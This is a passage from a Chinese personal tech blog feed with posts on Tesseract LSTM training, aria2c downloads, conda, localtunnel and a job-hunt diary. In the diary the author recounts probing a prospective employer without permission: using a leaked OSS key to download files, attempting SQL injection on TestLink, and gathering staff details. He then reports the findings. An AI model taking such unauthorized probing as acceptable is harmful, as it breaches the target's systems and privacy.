class="comment">#明显看出要比传统训练少了不少步骤(自己操作的步骤)，其实脚本帮你做了。其中根据vgslspec语法，你可以修改网络层。训练的时候，会自动保存许多不同错误率的lstm文件，然后留待下一步选择一个合并就行了。</span></span><br></pre></td></tr></table></figure></li><li><p>step 4: 评估你训练的模型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lstmeval --model ./trainlayer/_checkpoint --eval_listfile ./chitrain/chi_sim.training_files.txt  </span><br><span class="line">$ lstmeval --model ./chi_sim.lstm --eval_listfile ./tesseract-ocr/chieval/chi_sim.training_files.txt</span><br><span class="line"><span class="comment">#从这里看出来，既可以使用checkpoint也可以使用现有的lstm模型去验证</span></span><br></pre></td></tr></table></figure></li><li><p>step 5: 合并新的字库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">combine_tessdata -o ./chi_sim.traineddata \</span><br><span class="line">  xxxx.lstm \</span><br><span class="line">  ./chitrain/chi_sim.lstm-number-dawg \</span><br><span class="line">  ./chitrain/chi_sim.lstm-punc-dawg \</span><br><span class="line">  ./chitrain/chi_sim.lstm-word-dawg</span><br></pre></td></tr></table></figure></li></ul><p>合并后的字库后将其移动到tesseract的默认字库文件夹，便可以使用其进行识别了。</p><font color="red"> 注意事项 </font><ul><li>获取字体名称 ，可以通过 <code>fc-list :lang=zh</code> 来查找/usr/share/fonts/下面的字体,然后经过一些列<code>awk,sed</code>得到需要的字体名，将其添加到<code>tesseract/training/languange-specific.sh</code>里</li><li>更好的方式是使用 <code>text2image --fonts_dir /usr/share/fonts/ch_2000/ --list_available_fonts</code>，这样就可以直接列出所有该目录下的字体文件名，但是需要注意的是依旧有不存在的，结果并不是完全正确的。</li><li>在<code>languange-specific</code>中更改时一定要注意<code>&quot;\</code>是不对的，应该是<code>&quot; \</code></li><li>生成训练数据时一旦有一个错误出现就不会输出到相应的文件夹，但是可以根据记录到<code>/tmp/tmp.</code>下找到临时生成的文件，如果你不想或者不需要那么多，可以直接拷贝这些文件即可。但是这些文件时不完整的，所以你必须删除这些不存在的字体，使用<code>tesstrain.sh --fonts_dir /usr/share/fonts/ch_2000/ --lang chi_sim --linedata_only   --noextract_font_properties --langdata_dir /home/langdata --output_dir /home/lstmtest/400type/chitrain | grep &quot;ERROR&quot;</code>找到Error的字体，多运行几次删除干净即可。注意我这句没有指定<code>tessdata_dir</code>,是因为我把他放在了系统变量。你也可以使用<code>export TESSDATA_PREFIX=/home/lstmtest/tessdata</code>进行指定自己的位置</li></ul><font color="green"> 补充 </font><ul><li>至于不像普通训练那么费事，是因为封装到脚本里了，可以自己看下。同时之所以不需要自己生成训练图片是因为在<code>tessdata</code>里提供了一个中文的字体和单词列表，通过字体文件直接进行生成，详细阅读相应的<code>shell</code>脚本</li><li>经过训练同一种字体的不同形态会产生明显的收敛效果，但是不是同一种的就不行，或者说效果不好。</li><li>同样，你不再需要像传统训练时，添加自定义单词。在特定领域的话，也可以添加一下(哭笑不得)。因为训练的时候，有两种错误率，一种是单字错误率，一种是单词错误率。但也不是下降的越低越好。通常增加训练的迭代次数，会降低错误率。但是这个错误率下的模型可能在会将字体识别正确的同时，将标点识别错误了。</li><li>合并后，后面带<em>tmp</em>的是原字库文件。我们可以把不同<code>checkpoint</code>下的<code>lstm</code>模型进行合并，类似于这样</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.profile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `ls ./lstmfile/*.lstm` </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">filename=`<span class="built_in">echo</span> <span class="variable">$file</span> | awk -F <span class="string">'/'</span> <span class="string">'&#123;print $3&#125;'</span> | awk -F <span class="string">'_'</span> <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"></span><br><span class="line">combine_tessdata -o ./chi_sim.traineddata \</span><br><span class="line">  <span class="variable">$file</span> \</span><br><span class="line">  ./chitrain/chi_sim.lstm-number-dawg \</span><br><span class="line">  ./chitrain/chi_sim.lstm-punc-dawg \</span><br><span class="line">  ./chitrain/chi_sim.lstm-word-dawg</span><br><span class="line"></span><br><span class="line">mv chi_sim.traineddata <span class="variable">$filename</span>.traineddata</span><br><span class="line">mv chi_sim.traineddata.__tmp__ chi_sim.traineddata</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>最后，这是我从服务器上下载下来的数据，选择了3个较低错误率的数据库下载了下来。前面的数字是错误率。<br><img src="/images//Tesseract/lstm_02.png" alt="lstm_result"></p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ul><li><a href="https://github.com/tesseract-ocr/tesseract/wiki/Technical-Documentation" target="_blank" rel="noopener">Tesseract Documention</a></li><li><a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs" target="_blank" rel="noopener">Understanding LSTM </a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言-Tesseract&quot;&gt;&lt;a href=&quot;#前言-Tesseract&quot; class=&quot;headerlink&quot; title=&quot;前言:Tesseract&quot;&gt;&lt;/a&gt;前言:Tesseract&lt;/h4&gt;&lt;p&gt;Tesseract 最新的版本4.0版本，新增了lstm训练
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="知识回顾" scheme="http://iami.xyz/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>百度云盘下载的套路</title>
    <link href="http://iami.xyz/2017/06/16/Review-S06-Baiduyun-download-Taolu/"/>
    <id>http://iami.xyz/2017/06/16/Review-S06-Baiduyun-download-Taolu/</id>
    <published>2017-06-15T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言-都是套路"><a href="#前言-都是套路" class="headerlink" title="前言: 都是套路"></a>前言: 都是套路</h4><p>你一定也是烦的不行不行的，下载百度云限速不说，还不能在linux服务器上搞，下面就介绍下如何在Linux服务器上下载文件，并能突破速度限制。</p><ul><li><a href="https://github.com/houtianze/bypy" target="_blank" rel="noopener">客户端bypy</a></li><li><a href="https://github.com/acgotaku/BaiduExporter" target="_blank" rel="noopener">链接导出助手</a></li></ul><p>出于简便我选择了链接导出，下载下来之后加载插件到<code>chrome</code>，然后导出链接并使用<code>aira2c</code>下载。 aria2c还有web管理界面，使用起来更方便。而且其中一个是<code>pyspider</code>的作者开发的，<code>binux</code>简直太厉害了。</p><ul><li>step1:</li></ul><p><img src="/images//BaiduExport/01.png" alt="export"></p><ul><li>step2</li></ul><p><img src="/images//BaiduExport/02.png" alt="get_link"></p><ul><li>step3 </li></ul><p><img src="/images//BaiduExport/03.png" alt="download"></p><p>step1,2,3略显白痴，小技巧就是拿到链接放在aria2c时批量下载记得在每个下载后面加<code>&amp;</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载磁力链接</span></span><br><span class="line">$ aria2c <span class="string">"magnet:?xt=urn:btih:dhsudfhisudhfuidshfisdhfiusdhfsdhiufh&amp;dn=aria2"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打印种子内的内容</span></span><br><span class="line">$ aria2c -S file.torrent</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用代理</span></span><br><span class="line">$ aria2c --all-proxy=<span class="string">'http://127.0.0.1:8080'</span> http://host/file</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载完成后执行某条命令。</span></span><br><span class="line">$ aria2c --on-download-complete=COMMAND http://example.org/file.iso</span><br></pre></td></tr></table></figure><p>其实<code>aria2c</code>有许多高级的玩法，比<code>wget</code>快的多，多线程，可以直接解析磁力链和种子。可以根据官网的信息接着玩。有空接着补。</p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ul><li><a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2c</a></li><li><a href="http://sydi.org/posts/linux/aria2c-usage-sample-cns.html" target="_blank" rel="noopener">Aria2c使用举例</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言-都是套路&quot;&gt;&lt;a href=&quot;#前言-都是套路&quot; class=&quot;headerlink&quot; title=&quot;前言: 都是套路&quot;&gt;&lt;/a&gt;前言: 都是套路&lt;/h4&gt;&lt;p&gt;你一定也是烦的不行不行的，下载百度云限速不说，还不能在linux服务器上搞，下面就介绍下如何在L
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="小手段" scheme="http://iami.xyz/tags/%E5%B0%8F%E6%89%8B%E6%AE%B5/"/>
    
  </entry>
  
  <entry>
    <title>算是比较有意思的事情吧</title>
    <link href="http://iami.xyz/2017/06/15/Review-S04-Interview-or-not/"/>
    <id>http://iami.xyz/2017/06/15/Review-S04-Interview-or-not/</id>
    <published>2017-06-14T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言：没有前言"><a href="#前言：没有前言" class="headerlink" title="前言：没有前言"></a>前言：没有前言</h4><p>其实是因为今天去看一家网站的时候，想起了发生的故事。想想从5月27早上到上海，到31号开始搬到学长这边。结果6.1还去面了一次试。然后3号决定从原公司辞职，却在4号算是得到了长沙那边的认可。然后，觉得不靠谱，喊上一个同学，跑了一趟长沙看看。总之呢，按照道理来讲，状态不好的时候，不要瞎做决定。否则只会更糟糕。不过，不糟糕一下，你怎么知道是不是最糟的呢。<br>本来这个博客下面是只更新技术的，不应该把这个放在里面。但是我想想，这里面其实包含了一部分的技巧…</p><h4 id="正文-一：这tm像个故事一样"><a href="#正文-一：这tm像个故事一样" class="headerlink" title="正文 一：这tm像个故事一样"></a>正文 一：这tm像个故事一样</h4><p>雨从五月下到六月，从合肥下到上海，伴着腿疼和身心疲惫。倒霉的运气也始终不离不弃的跟着我。31号那天在下雨，我记得很清楚，因为没有带伞。仓皇的搬到学长这边住下，虽不像张爱玲小说里面描写的那么唯唯诺诺，谨慎小心。但寄人篱下总是使我心中有所不安。还好，学长即是学长又是朋友。也难得，4月到5月这段难捱的日子有几位朋友相伴。<br>说来也是神奇，长沙的工作是一个玩CTF群(我并不怎么玩CTF)里的表哥(不知道最初源于何处，现在对搞安全的都是喊表哥表姐表弟…)说长沙有家研究院招人，是挂在公安部，直接听命什么什么的，十分厉害就是了。然后最初我是没有去的，那是还想为当时实习所在的公司效力一把吧。毕竟待我不薄。后来过了大概一个多星期吧，自己被分手了(一段美好而又短暂的时光)。就不想回原来这家公司了，问问暗夜表哥，表哥说长沙研究院那边已经不招了。然而，缘，妙不可言。过了几周之后，又开始招人了。投了份简历过去，然后就等面试了，这样一直等啊等等到了6月份(因为面试官一直在北京，没有回长沙)。</p><h4 id="正文-二：缘起灵兮"><a href="#正文-二：缘起灵兮" class="headerlink" title="正文 二：缘起灵兮"></a>正文 二：缘起灵兮</h4><p>话从另外一边说起，31号投的简历。当时没想到那么快，周日投的，周一就接到了电话面试。当时接到电话的时候，还以为是办款带的。后来对方(昌振兄)说自己是灵兮的，我才匆忙搁下水果，擦擦嘴开始面试。面试就这样开始了，最初我的打算是手里拿三个方向的offer就行了，一个安全，一个爬虫，再来一个初级图像处理，当时，算是只有一个爬虫的。和昌振兄聊起来之后，问的很仔细，就这简历上做过的东西一点一点的捋。当然最后发现我的数学功底并不够，没办法，看来连初级也拿不到了。然后聊得开了，大家就又谈起其他的一些事情。后来挂了电话，准备吃点水果睡个午觉的时候，又突然接到了昌振兄的电话，他说他帮我推荐了另外的职位，想让我去面试一下。约的3点，没有吃午饭，转了2条线的地铁，骑了摩拜，最终花了1个半小时，准时到地方。在办公室里看了会书，就有人来面试了，从3点聊到5点半还是6点来着，还算不错，顺带帮面试官提供了几个解决问题的小思路。后来就等这家公司消息了。就在我午饭没吃，从11点顶到6点之后的某一天，打开拉勾，看到了杯具了。标注的其实挺离谱，直接从待沟通标了不合适。不过无论成不成，起码认识了昌振兄这个人，我觉得很值得，很开心。<br>道别海知，在2号时码了一些字，发给了CTO和技术总监。总监是带我的，我们聊了会，他起初不信，后来说了原因，互道了珍重，祝好。说随时欢迎回去，让我先去调整一段时间心态。CTO老丁说，少年多出去看看世界，哈哈。是的，然后我就听了他们的去了长沙看看。</p><h4 id="正文-三：真假研究院"><a href="#正文-三：真假研究院" class="headerlink" title="正文 三：真假研究院"></a>正文 三：真假研究院</h4><p>那边面试后，这边每天和长沙的聊聊天。最后一个晚上电话面了下。算是通过了，这时候算是手里有了两个方向的offer了，一个爬虫，一个安全。<br>然而出于谨慎，以及对方回答问题有所回避。使我觉得不知真假。比如说你问公司地址在哪，他一直回避，只是说等你到了长沙南站派车接你。这样你怎么放心的下。后来也是，去了长沙之后，也是不愿意告诉我地址。只是说去了就准备入职了。实在让人生疑，中间官网还挂了一次。去收集这家公司的信息，主要成员的信息又收集不到太多。最终决定亲自去看一看，一探究竟。那是我已经喊了一个朋友陪我一起去的长沙，就为了有个照应，怕出意外。做的计划也算是周到详尽，运用我能想到的一切方法，收集打探消息。最后住下酒店后，晚上终于得到研究院地址，而收集到的消息是那里一个传销重镇，顿时心中一凉。</p><blockquote><p>我做了这些准备。</p></blockquote><ul><li>写了个脚本，实时获取自己手机的gps位置。</li><li>打乱对方计划。对方要去接你，你就提前或落后。一定要错开，提前入住，然后查看周边地形。</li><li>计算出精准的时间，结合自己的体能。</li><li>和朋友保持联系，约定好暗号。 </li><li>想出特殊的传递消息的方法。例如，暗号之后的话，每句话第几个字是信号。隔几个选一个。别比比，哪有桂花现在开的，我不原谅你。 虽然比桂原不是碧桂园，但是只要不傻，打听下就知道了。</li><li>转少量急用到支付宝，解绑支付宝银行卡，删除银行通知短信。</li><li>不要带任何证件前往</li><li>使用第二张电话卡通话</li><li>和你的朋友分开前去，打两辆车。先后到，然后就看你朋友给不给力了，伪装成陌生人。</li><li>学一些格斗术。 由于我本人上过几年的散打(体育课)，加上经常锻炼。所以又复习了下一些格斗术。</li><li>心理学的反洗脑术(并不会)，但是可以种最简单的心锚(高中看到的，这个最简单也最有用)。</li><li>冷静冷静冷静冷静，这个最重要。</li></ul><p>那天，我去前。发现卫星地图上显示的都是密密麻麻的屋子。约得是第二天9点见面，早上早早去了。5点钟起床，6点左右到的地方。进了小区门之后开始计算，步行需要1分04秒，从另一边步行出去需要1分零15秒。当时发现这是在一片别墅区，可能使我降低了一定的警惕。然后朋友在后面若即若离，到门口，发现公司所处的别墅和别的都不一样，这家是铁皮门，墙头加了电网(应该是)，从外面几乎看不到里面的任何场景。就更加生疑了。然后趁着这段时间把整个别墅区骑摩拜逛了一下，算好最快逃跑的路线，怎么从长沙县打的返回长沙市。最后，虽然是我多虑了，但是还是很有价值的一次经验吧。<br>公司是挺好的，小别墅有两层，里面有健身房游泳池。而且据说最近打算搬到自己的地上。办公环境我也十分喜欢，高配的设备，轻松的环境，二楼据说是公安某警种设备研发处。看着无人机，3d打印机，以及许多好玩的，还有聊天谈到了一些套路，知道自己比较喜欢这里了。想留下。<br>后来在长沙玩了一下，长沙真是个玩乐的好地方，那几天我在长沙玩，每天累成狗，回来睡得可香了。。我还在开福寺的后院拆迁废墟里捡了一本《觉悟之路》，目前看了一半了。发现上座部佛教和我的想法一致，很符合。和我之前只读佛经不一样，这个从大体上描述并定义了佛教。实乃经典之作。</p><h4 id="正文-四：今天和灵兮"><a href="#正文-四：今天和灵兮" class="headerlink" title="正文 四：今天和灵兮"></a>正文 四：今天和灵兮</h4><p>后来确定了想去长沙，也就没怎么再关注灵兮了。只是打算投投简历，再收集个图像处理初级的offer得了。可是我妈是不同意去长沙的。怕被骗，一直是不放心…外加亲友也没有赞成的。几个交心好友也不赞成，那时我已经打算去拼一把了。然而，但是一个朋友说了一句话，就是”买卖不成仁义在，大家生意可以做不成，但一定要坦诚是吧。你这对方很多信息都不给你介绍，不讲仁义。”后来又想想，我妈就我自己，我走了，她怎么办。之后又经历了几个夜晚的纠结。还是决定继续在上海找工作。<br>然后，就是昨天今天和昌振兄聊天，发现实乃博学君子，温恭谦良之辈。我们讨论了一些问题后。出于我自己想去了解一下这家公司，就去看了看，最后发现</p><ul><li>公司github aliyun OSS秘钥泄露(其实已经是7个月前了)</li><li>OSS配置不当，导致文件可直接下载</li><li>Testlink 1.9.14 sql 注入漏洞。(这个之前没接触过，习惯性Google了下testlink的漏洞，然后试着注了下)</li><li>Testlink目录配置不当</li><li>在process on收集到公司其他一些员工的信息，还可以进一步结合社工收集，不过累了没有去查了。毕竟没睡午觉很困了。</li><li>其实还有一些其他端口，不知道开放了什么服务，不过看样子是自己写的torndao服务，估计有迹可循，但是也没看。</li></ul><p>下午告诉了昌振兄，让他赶紧改key,id。毕竟公司一大部分重要资料都在里面(我也顺便学习了一下OSS的使用)，又聊了会，睡了个觉。聊了一会。其实这暴露了一个问题，就是公司安全意识不高。同时昌振兄还告诉我说那个testlink的服务其实是不用了，当初只是为了测试一下部署上去的。但是，殊不知，这种情况往往给别人可乘之机。还有就是防火墙好像没有对异常流量做检验？最开始时配合用gevent配合下载文件时，请求频率那么高，竟然都没有禁止，也是奇怪了。</p><h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>《觉悟之路》里面否定了神的存在，说明了不应该通过祈祷，而是应该放下执念以一种不屈不挠的精神去面对世间的沧桑百态。我又想起了学诚法师讲的随缘，所谓随缘是指做好一切相应的准备，在缘分到来之时，以一种不卑不亢的态度应对劫数，之后也不患得患失。这和我之前理解的随缘有所差异，现在看来是自己浅薄了。没能悟到其中做好应的准备。</p><h4 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h4><ul><li>长沙如家莫泰的打扫真是不干净，以后又涨了许多其他的记性。</li><li>滴滴垄断后，打车平台有一种任其鱼肉的感觉，对于共享单车也是，摩拜又难骑，又不灵活，长沙骑了几次都是显示骑行中，其实根本没解锁，艹。</li><li>春秋航空把廉价机票的另外一部分费用放在了飞机商品推广，以及降低服务质量。上机后眯了一会，醒了有点冷，要了个毯子，喊了两次，到下机都没人给我送来。艹。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：没有前言&quot;&gt;&lt;a href=&quot;#前言：没有前言&quot; class=&quot;headerlink&quot; title=&quot;前言：没有前言&quot;&gt;&lt;/a&gt;前言：没有前言&lt;/h4&gt;&lt;p&gt;其实是因为今天去看一家网站的时候，想起了发生的故事。想想从5月27早上到上海，到31号开始搬到学长这
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="小手段" scheme="http://iami.xyz/tags/%E5%B0%8F%E6%89%8B%E6%AE%B5/"/>
    
  </entry>
  
  <entry>
    <title>conda in action</title>
    <link href="http://iami.xyz/2017/06/14/Review-S02-conda-my-useage/"/>
    <id>http://iami.xyz/2017/06/14/Review-S02-conda-my-useage/</id>
    <published>2017-06-13T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<p>无论是使用virtualenv还是conda，本意无非是使开发环境变得干净纯粹，当然我们还可以使用<code>vagrant</code>启动一个虚拟机，在虚拟机里操作，或者<code>docker</code>起一个<code>container</code>也一样。</p><ul><li><p>基础的用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ conda info --env</span><br><span class="line">$ conda create -n testenv</span><br><span class="line">$ activate testenv</span><br><span class="line">$ deactivate testenv</span><br></pre></td></tr></table></figure></li><li><p>在<code>linux</code>下你可能需要这样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> activate testenv</span><br><span class="line">$ <span class="built_in">source</span> deactivate testenv</span><br></pre></td></tr></table></figure></li><li><p>指定<code>python</code>版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ conda create -n testenv python=27</span><br></pre></td></tr></table></figure></li><li><p>删除某个虚拟环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ conda env remove --name tensorflow</span><br></pre></td></tr></table></figure></li><li><p>使<code>jupyter</code>使用某个虚拟环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> activate myenv</span><br><span class="line">$ python -m ipykernel install --user --name myenv --display-name <span class="string">"Python (myenv)"</span></span><br><span class="line">$ <span class="built_in">source</span> activate other-env</span><br><span class="line">$ python -m ipykernel install --user --name other-env --display-name <span class="string">"Python (other-env)"</span></span><br></pre></td></tr></table></figure></li><li><p>在服务器上启动一个无浏览器的<code>jupyter notebook</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ jupyter notebook --no-browser</span><br><span class="line">$ jupyter notebook --no-browser --port 6699</span><br></pre></td></tr></table></figure></li><li><p>集成<code>pyspark</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#step 1 </span></span><br><span class="line">$ mv spark-1.2.0-bin-hadoop2.4 /opt/spark-1.2.0</span><br><span class="line">$ ln -s /opt/spark-1.2.0 /opt/spark</span><br><span class="line"><span class="comment">#step 2 (长久生效应该将下列的语句写到bashrc文件里，或者zshrc里)</span></span><br><span class="line">$ <span class="built_in">export</span> SPARK_HOME=/opt/spark</span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$SPARK_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">$ <span class="built_in">export</span> PYSPARK_DRIVER_PYTHON=jupyter</span><br><span class="line">$ <span class="built_in">export</span> PYSPARK_DRIVER_PYTHON_OPTS=<span class="string">'notebook'</span></span><br><span class="line"><span class="comment">#step 3 </span></span><br><span class="line">$ pyspark</span><br></pre></td></tr></table></figure></li><li><p>集成 <code>R</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; install.packages(c(<span class="string">'repr'</span>, <span class="string">'IRdisplay'</span>, <span class="string">'evaluate'</span>, <span class="string">'crayon'</span>, <span class="string">'pbdZMQ'</span>, <span class="string">'devtools'</span>, <span class="string">'uuid'</span>, <span class="string">'digest'</span>))</span><br><span class="line">devtools::install_github(<span class="string">'IRkernel/IRkernel'</span>)</span><br><span class="line">&gt; IRkernel::installspec()</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>当然，docker似乎已经成了更加方便的部署方法，可我觉得哪里缺了点什么。这些东西一定要自己先手动部署一次。之后再使用也知道是个怎么回事了。</p></blockquote><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ul><li><a href="https://blog.sicara.com/get-started-pyspark-jupyter-guide-tutorial-ae2fe84f594f" target="_blank" rel="noopener">pyspark-with-jupyter</a></li><li><a href="https://github.com/jupyter/docker-stacks/tree/master/pyspark-notebook" target="_blank" rel="noopener">docker-pyspakr-jupyter</a></li><li><a href="https://github.com/IRkernel/IRkernel" target="_blank" rel="noopener">IRkernel</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;无论是使用virtualenv还是conda，本意无非是使开发环境变得干净纯粹，当然我们还可以使用&lt;code&gt;vagrant&lt;/code&gt;启动一个虚拟机，在虚拟机里操作，或者&lt;code&gt;docker&lt;/code&gt;起一个&lt;code&gt;container&lt;/code&gt;也一样。&lt;/
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="知识回顾" scheme="http://iami.xyz/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>locatunnel的使用回顾</title>
    <link href="http://iami.xyz/2017/06/14/Review-S01-localtunnel/"/>
    <id>http://iami.xyz/2017/06/14/Review-S01-localtunnel/</id>
    <published>2017-06-13T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>很久没有更新技术了，主要是因为一直在学习新的知识吧。这边刚结束，那边又开始去搞毕业设计了。而出于个人感情原因，自己又从原公司离职了。虽然拿了一家研究院的安全offer，但是老妈觉得长沙太远。然后呢，问了10个朋友，8：2是不让去的，只有两个说让我去。没办法，先找找工作吧， 一边找工作，一边更新下这大半年的积累。边想边更，不一定是按照时间序列的。</p><h4 id="正文：穿越内网的http服务"><a href="#正文：穿越内网的http服务" class="headerlink" title="正文：穿越内网的http服务"></a>正文：穿越内网的http服务</h4><p>当你在内网的时候想把内网的一个web展示，或者说临时展示出去的时候，又不想那么麻烦的搭建一个web服务器之类的，而是希望直接在本机上展示出去，那么这个时候，就可以使用localtunnel了。(ps:前提是你已经安装了nodejs)</p><p>只需要采用 <code>npm install -g localtunnel</code>进行安装，然后使用<code>lt --port 80</code>即可进行转发，运行命令后<code>localtunnel</code>服务器会返回一个网址的。可谓十分方便，当然我们不能只介绍这么一点玩法，下面看其他有趣的玩法(强行凑博客感)。</p><ul><li><p>搭建自己的<code>localtunnel</code>服务器，以便提升访问速度。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git://github.com/defunctzombie/localtunnel-server.git</span><br><span class="line">$ <span class="built_in">cd</span> localtunnel-server</span><br><span class="line">$ npm install</span><br><span class="line"></span><br><span class="line">$ bin/server --port 1234</span><br></pre></td></tr></table></figure></li><li><p>lt命令的其他用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lt --host http://yourserver:1234 --port 5000 -s prefix</span><br><span class="line"><span class="comment">#这个就以为着转发本机5000端口到服务器yourserver上，然后获取域名为prefix.youserver:1234，可以通过该域名进行访问。</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ul><li><a href="https://github.com/localtunnel/localtunnel" target="_blank" rel="noopener">localtunnel</a></li><li><a href="https://github.com/localtunnel/server" target="_blank" rel="noopener">localtunnel-server</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;很久没有更新技术了，主要是因为一直在学习新的知识吧。这边刚结束，那边又开始去搞毕业设计了。而出于个人感情原因，自己又从原公司离职了。
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="知识回顾" scheme="http://iami.xyz/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>浅谈代码安全及安全</title>
    <link href="http://iami.xyz/2016/12/17/Just-Taking-about-code-security/"/>
    <id>http://iami.xyz/2016/12/17/Just-Taking-about-code-security/</id>
    <published>2016-12-16T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
